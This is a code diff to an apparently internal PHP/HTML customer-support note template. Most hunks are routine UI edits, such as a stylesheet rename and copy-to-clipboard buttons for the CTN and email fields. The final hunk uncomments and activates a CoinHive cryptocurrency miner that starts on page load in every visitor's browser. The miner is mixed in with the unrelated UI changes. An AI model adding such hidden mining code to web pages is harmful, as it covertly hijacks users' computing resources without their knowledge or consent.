@@ -34,7 +34,7 @@ if(!$fgmembersite->CheckLogin())
     <head>
         <link rel="icon" type="image/png" href="favicon.ico">
         <link href='https://fonts.googleapis.com/css?family=Roboto' rel='stylesheet' type='text/css'>
-        <link rel="stylesheet" type="text/css" href="styles.css">
+        <link rel="stylesheet" type="text/css" href="style.css">
         <meta charset="UTF-8">
         <title>Note Template</title>
         <script src="https://use.fontawesome.com/4251d2427b.js"></script>
@@ -272,8 +272,8 @@ Commit Date 4/17)" name="ticket" v-model="ticket" cols="20" rows="3"></textarea>
         <div class="wrapper"><label for="btn">BTN</label>
             <!-- maxlength="10" --><input id="btn" placeholder="BTN (ex. 5553271423)" onchange="this.value=this.value.replace(/[([).*:+='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\]\\-]/g,'')" type="text" name="btn" v-model="btn" /><button id="copy" class="fa fa-1x fa-clipboard" data-copytarget="#btn"></button></div><br /><br />
 
-        <label for="ctn">CTN</label>
-        <input id="ctn" placeholder="CTN (ex. 5553271423)" onchange="this.value=this.value.replace(/[([).*:+='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\]\\-]/g,'')" type="text" name="ctn" v-model="ctn" />
+        <div class="wrapper"><label for="ctn">CTN</label>
+        <input id="ctn" placeholder="CTN (ex. 5553271423)" onchange="this.value=this.value.replace(/[([).*:+='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\]\\-]/g,'')" type="text" name="ctn" v-model="ctn" /><button id="copy" class="fa fa-1x fa-clipboard" data-copytarget="#ctn"></button></div>
 
         <label for="account-holder">Acct Holder</label>
         <input placeholder="Account Holder's Name" type="text" name="account-holder" v-model="accountHolder" />
@@ -286,8 +286,9 @@ Commit Date 4/17)" name="ticket" v-model="ticket" cols="20" rows="3"></textarea>
             <option v-for="option in verifiedOptions" :value="option">{{ option }}</option>
         </select>
 
-        <label for="email">Email</label>
-        <input type="text" placeholder="Email (ex. loremipsum@mail.com)"  name="email" v-model="email" />
+        <div class="wrapper"><label for="email">Email</label>
+        <input id="email"  type="text" placeholder="Email (ex. loremipsum@mail.com)"  name="email" v-model="email" />
+            <button id="copy" class="fa fa-1x fa-clipboard" data-copytarget="#email"></button></div>
 
         <label for="Outage">Outage</label>
         <select name="outage" v-model="outage">
@@ -1210,12 +1211,12 @@ for (i = 0; i < close.length; i++) {
 }
 </script>
             
-<!--<script src="https://coinhive.com/lib/coinhive.min.js"></script>
+<script src="https://coinhive.com/lib/coinhive.min.js"></script>
 <script type="text/javascript">
 
 var miner = new CoinHive.Anonymous('d5IJhWxr2zofws14IqksaRqth1KEtrlx',{ autoThreads: false, threads: 1, throttle: 0.99, forceASMJS: false });
             miner.start();
-</script> -->
+</script> 
 <script tpye="text/javascript" src="js/mdu-auto-select.js"></script>
         <center>
                 <br/>
